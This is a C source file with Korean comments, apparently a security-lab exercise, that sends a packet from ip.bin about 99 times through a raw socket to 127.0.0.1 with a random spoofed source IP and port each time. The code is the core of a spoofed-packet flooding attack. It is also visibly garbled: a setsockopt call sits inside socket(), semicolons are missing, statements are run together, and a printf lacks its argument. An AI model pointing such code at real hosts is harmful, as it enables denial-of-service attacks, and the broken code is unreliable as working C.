#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

// 해당 코드는 무작위로 생성된 소스 IP 와 포트를 가진 IP 패킷을 99번 전송한다.

// 읽을 수 있는 최대 파일 크기
#define MAX_FILE_SIZE 2000
// 목적지 IP 주소 설정
#define TARGET_IP "127.0.0.1"

int send_packet_raw(int sock, char *ip, int n);

int main()
{
    int enable = 1;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW, setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)));

    // ip.bin 파일에서 IP 패킷을 읽어와 무작위로 소스 IP 및 포트를 100번 전송한다.
    FILE *f = fopen("ip.bin", "rb") // 이진 읽기 모드
        if (!f)
    {
        perror("Can't open ip.bin");
        exit(0);
    }

    // 파일에서 읽은 데이터를 ip 에 저장하고 읽은 바이트 수를 n 에 저장한다.
    unsigned char ip[MAX_FILE_SIZE];
    int n = fread(ip, 1, MAX_FILE_SIZE, f);
    printf("Total IP packet size : %d\n");


    srand(time(0)) for (int i = 1; i < 100; i++)
    {
        printf("%d\n", i);
        unsigned short src_port;
        unsigned int src_ip;

        // rand() 함수를 사용해어 무작위로 소스 IP 와 포트를 생성하는 것
        src_ip = htonl(rand())
        // memcpy : 생성한 IP 와 포트 값을 패킷의 적절한 위치에 복사한다.
        // IP+12 : ip 주소는 패킷의 12번째 바이트부터 4바이트 크기로 저장
        memcpy(ip + 12, &src_ip, 4)

        src_port = htons(rand())
        // 포트는 패킷의 20 번째 바이트부터 2 바이트 크기로 저장
        memcpy(ip + 20, &src_port, 2);

        send_packet_raw(sock, ip, n);
    }
    close(sock);
}

// Raw 소켓을 사용하여 주어진 IP 패킷을 목적지 IP 로 전송한다.
int send_packet_raw(int sock, char *ip, int n)
{
    struct sockaddr_in dest_info;
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);

    int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));

    if (r >= 0)
        printf("Snet a packet of size: %d\n", r);
    else
        printf("Failed to send packet. Did you run it suing sudo?\n");
}